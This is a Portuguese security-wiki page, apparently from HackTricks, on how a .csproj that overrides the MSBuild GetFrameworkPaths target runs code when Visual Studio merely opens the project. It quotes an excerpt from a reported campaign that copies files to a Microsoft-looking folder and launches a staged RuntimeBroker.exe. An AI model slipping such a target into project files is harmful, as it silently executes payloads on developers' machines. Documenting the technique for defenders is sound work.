# Execução do MSBuild em tempo de design de projetos do Visual Studio

{{#include ../banners/hacktricks-training.md}}

Abrir um projeto C# no Visual Studio não é uma leitura passiva. A compilação em tempo de design invoca targets nomeados do MSBuild para inicializar o IntelliSense, as referências e a depuração **antes** de o desenvolvedor selecionar Build ou Run. `GetFrameworkPaths` é um desses targets. Um projeto que o redefine pode transformar o carregamento do projeto em execução de código no contexto do usuário, sem que seja necessário clicar em um payload separado.<sup>[[1]](#references)[[2]](#references)</sup>

O projeto relatado declarava arquivos de recursos e, em seguida, usava `MakeDir`, `Copy` e `Exec` dentro do target substituto para preparar e iniciar um payload no mesmo diretório. Este extrato reduzido preserva o caminho de execução mostrado na Figura 6 da fonte; ele deve ficar dentro de um `.csproj`, não em um arquivo XML independente.<sup>[[1]](#references)</sup>

```xml
<ItemGroup>
  <ResourceFiles Include="Resources\**\*.*" />
</ItemGroup>
<Target Name="GetFrameworkPaths">
  <MakeDir Directories="$(LocalAppData)\Microsoft\RuntimeBrokers" />
  <Copy SourceFiles="@(ResourceFiles)"
        DestinationFolder="$(LocalAppData)\Microsoft\RuntimeBrokers\%(RecursiveDir)"
        SkipUnchangedFiles="true" />
  <Exec Command='start "" "$(LocalAppData)\Microsoft\RuntimeBrokers\RuntimeBroker.exe"' />
</Target>
```

**A ordem de importação importa:** o MSBuild usa a *última* definição de um target. Não há garantia de que um target escrito em um arquivo de projeto substitua o target da Microsoft se uma importação posterior o redefinir. Projetos no estilo SDK que usam `<Project Sdk="...">` importam implicitamente os targets do SDK após o corpo do projeto; portanto, inspecione a ordem de importação avaliada em vez de presumir que essa substituição exata funciona em todos os projetos. `MSBuild.exe -preprocess:expanded.xml project.csproj` expande as importações sem compilar o projeto e pode ajudar a localizar a definição efetiva do target.<sup>[[3]](#references)[[4]](#references)</sup>

Esta é uma superfície de execução de projetos de desenvolvimento, não uma instalação de extensão VSIX nem, por si só, uma escalada de privilégios. Se o executável preparado usar um `.exe.config` ou uma DLL maliciosos no mesmo diretório, continue com [AppDomainManager hijacking and DLL sideloading](windows-local-privilege-escalation/dll-hijacking/).

## References

- [1] [Unit 42 - Campanha Blinder Tunnel tem como alvo infraestrutura iraquiana](https://unit42.paloaltonetworks.com/blinder-tunnel-targets-critical-infrastructure/)
- [2] [Microsoft Learn - Integração com o Visual Studio (MSBuild)](https://learn.microsoft.com/en-us/visualstudio/msbuild/visual-studio-integration-msbuild?view=visualstudio)
- [3] [Microsoft Learn - Targets do MSBuild](https://learn.microsoft.com/en-us/visualstudio/msbuild/msbuild-targets)
- [4] [Microsoft Learn - Referência da linha de comando do MSBuild](https://learn.microsoft.com/en-us/visualstudio/msbuild/msbuild-command-line-reference?view=visualstudio)
{{#include ../banners/hacktricks-training.md}}
